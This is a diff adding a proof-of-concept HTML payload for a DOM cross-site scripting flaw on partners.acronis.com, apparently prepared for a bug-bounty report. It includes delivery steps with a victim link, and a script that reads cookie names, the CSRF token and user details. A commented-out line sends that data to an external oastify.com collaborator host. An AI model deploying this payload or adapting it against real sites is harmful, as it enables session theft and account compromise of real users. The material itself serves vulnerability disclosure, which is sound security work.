@@ -1,0 +1,50 @@
+<!--
+  POC: H2 - checkURL() Protocol-Relative URL Bypass -> DOM XSS
+  Target: partners.acronis.com
+
+  HOST THIS FILE IN YOUR GITHUB REPO, then send victim:
+  https://partners.acronis.com/#//raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/poc_h2_payload.html
+
+  What happens:
+  1. checkURL() reads location.hash -> "//raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/poc_h2_payload.html"
+  2. Regex /^(https?:|file:|ftp:|data:|javascript:)/i does NOT match // (protocol-relative)
+  3. loadURL() sends AJAX GET to this file
+  4. raw.githubusercontent.com responds with Access-Control-Allow-Origin: * (CORS allowed!)
+  5. container.html(data) injects response -> jQuery executes <script> tags
+  6. XSS fires in context of partners.acronis.com
+-->
+<div id="xss-poc" style="display:none">
+  <h2>DOM XSS PoC - H2 checkURL Protocol-Relative Bypass</h2>
+  <p>If you see this alert, the vulnerability is confirmed.</p>
+</div>
+<script>
+  // PoC: Extract session info to prove impact
+  (function() {
+    var proof = {
+      domain: document.domain,
+      cookie_keys: document.cookie.split(';').map(function(c) { return c.trim().split('=')[0]; }),
+      csrf_token: (document.cookie.match(/X-CSRF-Token=([^;]+)/) || [])[1] || 'not found',
+      url: location.href,
+      user_id: (typeof pageData !== 'undefined' && pageData.userid) ? pageData.userid : 'N/A',
+      user_name: (typeof pageData !== 'undefined' && pageData.userName) ? pageData.userName : 'N/A',
+      timestamp: new Date().toISOString()
+    };
+
+    // Alert with proof
+    alert(
+      'DOM XSS via checkURL() bypass!\n\n' +
+      'Domain: ' + proof.domain + '\n' +
+      'User ID: ' + proof.user_id + '\n' +
+      'User: ' + proof.user_name + '\n' +
+      'CSRF Token: ' + proof.csrf_token + '\n' +
+      'Cookie Keys: ' + proof.cookie_keys.join(', ')
+    );
+
+    // Log to console for screenshot evidence
+    console.log('[H2-POC] DOM XSS Proof:', JSON.stringify(proof, null, 2));
+
+    // OPTIONAL: Exfil to attacker server (uncomment for full chain demo)
+    // var img = new Image();
+    // img.src = 'https://uhfa77zdonhqkbm4xziziygax13srmqaf.oastify.com/?data=' + btoa(JSON.stringify(proof));
+  })();
+</script>
